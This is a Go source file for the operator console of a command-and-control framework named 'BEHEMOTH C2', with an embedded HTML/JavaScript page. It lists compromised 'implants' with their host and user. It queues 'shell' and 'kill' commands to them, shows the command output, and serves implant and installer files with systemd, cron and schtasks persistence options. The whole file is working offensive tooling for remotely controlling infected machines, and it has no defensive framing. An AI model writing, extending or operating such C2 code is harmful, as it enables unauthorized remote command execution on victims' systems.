package c2

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"path/filepath"
	"strings"
	"time"
)

// consolePath is where the operator console is mounted (on the main server
// mux or the dedicated listener).
const consolePath = "/c2/ui/"

// Console serves the token-authed operator UI over the manager state.
type Console struct {
	M *Manager
}

// RegisterConsole mounts the console on mux.
func RegisterConsole(mux *http.ServeMux, c *Console) {
	mux.HandleFunc(consolePath, c.page)
	mux.HandleFunc(consolePath+"data", c.data)
	mux.HandleFunc(consolePath+"cmd", c.cmd)
	mux.HandleFunc(consolePath+"file/", c.file)
}

// authOK validates the console token from the query string, form body, or
// cookie.
func (c *Console) authOK(r *http.Request) bool {
	want := c.M.ConsoleToken()
	if t := r.URL.Query().Get("t"); t != "" {
		return t == want
	}
	if strings.EqualFold(r.Method, http.MethodPost) {
		if err := r.ParseForm(); err == nil {
			if t := r.PostFormValue("t"); t != "" {
				return t == want
			}
		}
	}
	if ck, err := r.Cookie("c2_token"); err == nil {
		return ck.Value == want
	}
	return false
}

func (c *Console) page(w http.ResponseWriter, r *http.Request) {
	if !c.authOK(r) {
		http.Error(w, "unauthorized: append ?t=<console token>", http.StatusUnauthorized)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = consoleTmpl.Execute(w, nil)
}

// consoleData is the JSON snapshot the console polls.
type consoleData struct {
	Implants []implantView   `json:"implants"`
	Tasks    map[string]Task `json:"tasks,omitempty"`
	Results  []Result        `json:"results,omitempty"`
	Now      string          `json:"now"`
}

// implantView augments Implant with the derived status for JSON output.
type implantView struct {
	Implant
	Status string `json:"status"`
}

func (c *Console) data(w http.ResponseWriter, r *http.Request) {
	if !c.authOK(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	var implants []implantView
	for _, im := range c.M.List() {
		implants = append(implants, implantView{Implant: im, Status: im.Status()})
	}
	tasks := map[string]Task{}
	for _, iv := range implants {
		for _, t := range c.M.Tasks(iv.ID, 10) {
			tasks[fmt.Sprintf("%s/%d", iv.ID, t.ID)] = t
		}
	}
	var results []Result
	for _, res := range c.M.Results("", 50) {
		results = append(results, res)
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	_ = json.NewEncoder(w).Encode(consoleData{
		Implants: implants,
		Tasks:    tasks,
		Results:  results,
		Now:      time.Now().UTC().Format(time.RFC3339),
	})
}

func (c *Console) cmd(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method", http.StatusMethodNotAllowed)
		return
	}
	if !c.authOK(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, "bad form", http.StatusBadRequest)
		return
	}
	id := r.FormValue("id")
	cmd := r.FormValue("cmd")
	args := r.FormValue("args")
	if cmd != CmdShell && cmd != CmdKill {
		http.Error(w, "cmd must be shell|kill", http.StatusBadRequest)
		return
	}
	t, err := c.M.AddTask(id, cmd, args, 0)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(t)
}

// file serves a build artifact (implant/installer) by id+name, token-authed.
func (c *Console) file(w http.ResponseWriter, r *http.Request) {
	if !c.authOK(r) {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	rest := strings.TrimPrefix(r.URL.Path, consolePath+"file/")
	id, name, _ := strings.Cut(rest, "/")
	if id == "" || name == "" || strings.Contains(name, "/") || strings.Contains(name, "..") {
		http.Error(w, "bad path", http.StatusBadRequest)
		return
	}
	im, ok := c.M.Get(id)
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	allowed := map[string]bool{implantFileName(im.Runtime): true}
	for _, p := range []string{"none", "systemd", "cron", "schtasks"} {
		allowed[installFileName(im.Platform, p)] = true
	}
	allowed["README.txt"] = true
	if !allowed[name] {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, filepath.Join(c.M.BuildDir(id), name))
}

var consoleTmpl = template.Must(template.New("console").Parse(consoleHTML))

// consoleHTML is the single-page operator UI. It polls /data every 5s and
// queues commands via /cmd; auth rides on the ?t= token.
const consoleHTML = `<!doctype html>
<html><head><meta charset="utf-8"><title>BEHEMOTH C2</title>
<style>
body{font-family:system-ui,sans-serif;margin:2rem;background:#111;color:#ddd}
table{border-collapse:collapse;width:100%;margin:1rem 0}
td,th{border:1px solid #333;padding:.35rem .6rem;text-align:left;font-size:.9rem}
input,select,button{background:#222;color:#ddd;border:1px solid #444;padding:.3rem}
button{cursor:pointer}
.badge{padding:.1rem .5rem;border-radius:.8rem;font-size:.75rem}
.active{background:#14532d}.stale{background:#713f12}.registered{background:#1e3a8a}.killed{background:#450a0a}
pre{background:#1a1a1a;padding:.6rem;max-width:60rem;overflow:auto}
</style></head><body>
<h1>BEHEMOTH C2 console</h1>
<h2>Implants</h2>
<table id="implants"></table>
<h2>Queue command</h2>
<form id="f">
<input name="id" placeholder="implant id" size="34" required>
<select name="cmd"><option value="shell">shell</option><option value="kill">kill</option></select>
<input name="args" placeholder="command" size="60">
<button>Queue</button>
</form>
<h2>Recent tasks</h2>
<table id="tasks"></table>
<h2>Recent results</h2>
<table id="results"></table>
<script>
const qs = new URLSearchParams(location.search);
const tok = qs.get("t") || (document.cookie.match(/c2_token=([^;]+)/)||[])[1] || "";
const enc = new URLSearchParams(); enc.set("t", tok);
const esc = s => String(s||"").replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;"}[c]));
async function refresh(){
  const d = await (await fetch("data?"+enc)).json();
  const st = {active:"active",stale:"stale",registered:"registered",killed:"killed"};
  const it = document.getElementById("implants");
  it.innerHTML = "<tr><th>ID</th><th>Label</th><th>Status</th><th>Host</th><th>User</th><th>Last seen</th><th>Sleep</th><th>Files</th></tr>";
  for (const i of d.implants||[]) {
    const tr = it.insertRow();
    tr.innerHTML = "<td>"+esc(i.id)+"</td><td>"+esc(i.label)+"</td>"+
      "<td><span class='badge "+st[i.status]+"'>"+i.status+"</span></td>"+
      "<td>"+esc(i.host)+"</td><td>"+esc(i.user)+"</td>"+
      "<td>"+esc(i.last_seen)+"</td><td>"+i.sleep_seconds+"s (+/-"+i.jitter_pct+"%)</td>"+
      "<td><a href='file/"+i.id+"/README.txt?"+enc+"'>readme</a></td>";
  }
  const tt = document.getElementById("tasks");
  tt.innerHTML = "<tr><th>Implant</th><th>#</th><th>Cmd</th><th>Args</th><th>Status</th></tr>";
  const tasks = Object.entries(d.tasks||{}).sort((a,b)=>b[0].localeCompare(a[0]));
  for (const [k,v] of tasks) {
    const tr = tt.insertRow();
    tr.innerHTML = "<td>"+esc(v.implant_id)+"</td><td>"+v.id+"</td><td>"+v.cmd+"</td><td><code>"+esc(v.args)+"</code></td><td>"+v.status+"</td>";
  }
  const rt = document.getElementById("results");
  rt.innerHTML = "<tr><th>Implant</th><th>#</th><th>Exit</th><th>Output</th></tr>";
  for (const r of (d.results||[]).slice(0,20)) {
    const tr = rt.insertRow();
    tr.innerHTML = "<td>"+esc(r.implant_id)+"</td><td>"+r.task_id+"</td><td>"+r.exit+"</td><td><pre>"+esc(r.output||r.error)+"</pre></td>";
  }
}
document.getElementById("f").onsubmit = async (e) => {
  e.preventDefault();
  const fd = new FormData(e.target);
  fd.set("t", tok);
  const r = await fetch("cmd", {method:"POST", body:fd});
  if (!r.ok) alert(await r.text());
  refresh();
  return false;
};
refresh(); setInterval(refresh, 5000);
</script></body></html>
`
